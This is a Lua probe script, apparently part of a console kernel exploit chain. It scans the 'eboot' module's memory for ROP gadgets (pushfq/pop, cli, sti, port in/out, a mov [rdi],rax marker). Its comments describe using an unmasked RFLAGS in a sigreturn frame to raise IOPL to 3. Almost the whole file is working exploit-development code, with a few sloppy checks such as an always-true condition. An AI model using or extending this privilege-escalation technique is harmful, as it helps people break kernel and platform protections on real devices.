-- CRASH_CLASS: LOW
-- PROBE 815a: find the eboot gadgets the frame experiment needs
--
-- Context: sigreturn (417) installs a user-supplied frame verbatim (814b).
-- Because the handler returns EJUSTRETURN, the kernel never writes tf_rax,
-- so the RAX we put in the frame is the value Lua sees as the return.
-- That gives a self-verifying channel. The frame also carries RFLAGS, which
-- the kernel copies with no masking, so IOPL can be raised to 3 if the iretq
-- honours it. Needed gadgets:
--   pushfq; pop rax; ret   (9C 58 C3)  read RFLAGS with the caller's RSP
--   pushfq; pop rbx; ret   (9C 5B C3)  same, other register
--   cli; ret               (FA C3)     legal only at IOPL >= 3
--   in  eax, dx; ret       (ED C3)     port read, legal only at IOPL >= 3
--   out dx, eax; ret       (EF C3)     port write
-- Plus the known marker gadget mov [rdi], rax; ret (48 89 07 C3).

print("=== PROBE 815a: EBOOT GADGET SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rdb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

-- eboot module: base and size from the region map (sys 674) used before.
local EBOOT_BASE = 0x1A880000
local EBOOT_SIZE = 0x494000

-- Read aligned dwords only and test the three unaligned shifts inside each.
local rd_dw = memory.read_dword
local words = {}
local nw = 0
for off = 0, EBOOT_SIZE - 4, 4 do
    nw = nw + 1
    words[nw] = to_num(rd_dw(EBOOT_BASE + off))
end
print(string.format("[S] read %d aligned dwords (0x%X bytes)", nw, nw * 4))

local function find3(b0, b1, b2, limit)
    local out = {}
    local pat = b0 + b1 * 0x100 + b2 * 0x10000
    for i = 1, nw do
        local v = words[i]
        if math.floor(v / 0x1000000) % 0x100 == 0 or true then
            for k = 0, 3 do
                local shift = 1
                for _ = 1, k do shift = shift * 256 end
                if math.floor(v / shift) % 0x1000000 == pat then
                    out[#out + 1] = EBOOT_BASE + (i - 1) * 4 + k
                    if #out >= limit then return out end
                end
            end
        end
    end
    return out
end

local patterns = {
    { "pushfq;pop rax;ret", 0x9C, 0x58, 0xC3 },
    { "pushfq;pop rbx;ret", 0x9C, 0x5B, 0xC3 },
    { "pushfq;pop rcx;ret", 0x9C, 0x59, 0xC3 },
    { "pushfq;pop rdx;ret", 0x9C, 0x5A, 0xC3 },
    { "cli;ret",            0xFA, 0xC3, 0x00 },
    { "sti;ret",            0xFB, 0xC3, 0x00 },
    { "in eax,dx;ret",      0xED, 0xC3, 0x00 },
    { "out dx,eax;ret",     0xEF, 0xC3, 0x00 },
    { "mov [rdi],rax;ret",  0x48, 0x89, 0x07 },
}

for _, p in ipairs(patterns) do
    local limit = 5
    if p[4] == 0x00 then limit = 5 end
    local hits = find3(p[2], p[3], p[4], limit)
    local txt = ""
    for i, a in ipairs(hits) do txt = txt .. string.format(" %X", a) end
    print(string.format("[G] %-20s hits=%d%s", p[1], #hits, txt))
end

-- Two-byte forms (cli;ret etc.) need their own pass: search pairs.
local function find2(b0, b1, limit)
    local out = {}
    local pat = b0 + b1 * 0x100
    for i = 1, nw do
        local v = words[i]
        for k = 0, 3 do
            local shift = 1
            for _ = 1, k do shift = shift * 256 end
            if math.floor(v / shift) % 0x10000 == pat then
                out[#out + 1] = EBOOT_BASE + (i - 1) * 4 + k
                if #out >= limit then return out end
            end
        end
    end
    return out
end
for _, p in ipairs({ { "cli;ret", 0xFA, 0xC3 }, { "sti;ret", 0xFB, 0xC3 },
                     { "in eax,dx;ret", 0xED, 0xC3 }, { "out dx,eax;ret", 0xEF, 0xC3 } }) do
    local hits = find2(p[2], p[3], 5)
    local txt = ""
    for i, a in ipairs(hits) do txt = txt .. string.format(" %X", a) end
    print(string.format("[H] %-20s hits=%d%s", p[1], #hits, txt))
end

print("")
print("=== PROBE 815a DONE ===")
